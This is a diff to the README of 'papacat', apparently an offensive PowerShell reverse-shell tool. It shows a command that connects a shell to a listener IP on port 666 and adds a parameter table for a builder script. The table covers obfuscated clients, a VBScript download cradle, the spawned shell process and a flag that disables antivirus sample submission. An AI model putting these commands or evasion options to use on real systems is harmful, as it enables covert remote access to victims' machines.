@@ -102,8 +102,21 @@ papacat -c 192.168.1.72 -ep -p 666 -v
 
 # papacat Automation - Obfuscation
 
-[Builder.ps1](https://github.com/r00t-3xp10it/redpill/blob/main/utils/papacat_rev_shell/Builder.ps1) cmdlet automates the creation of papacat reverse tcp shell<br />( crandle + payload + handler ) and encode\decode tcp data flow if invoked with -force 'true' parameter.<br />
+[Builder.ps1](https://github.com/r00t-3xp10it/redpill/blob/main/utils/papacat_rev_shell/Builder.ps1) cmdlet automates the creation of papacat reverse tcp shell<br />( crandle + payload + handler ) and encode\decode tcp data flow if invoked -force 'true' param.<br />
 GitHub: [https://github.com/r00t-3xp10it/redpill/blob/main/utils/papacat_rev_shell/Builder.ps1](https://github.com/r00t-3xp10it/redpill/blob/main/utils/papacat_rev_shell/Builder.ps1)
+
+<br />
+
+|Parameter Name|Description|Default Value|Optional value|
+|---|---|---|---|
+|action|creates raw\obfuscated client|obfuscate|rawcat|
+|ClientName|Reverse tcp shell name|revshell|user_input|
+|VbsName|Vbscript download crandle name|update|user_input|
+|Execute|name of the process to start|cmd.exe|powershell.exe|
+|TimeOut|seconds to wait before giving up on listening|120|user_input|
+|serverPort|Python3 http.server port number|8080|user_input|
+|PayloadPort|Reverse tcp shell port number|666|user_input|
+|Force|Disable AV sample submition|false|true|
 
 <br />
 
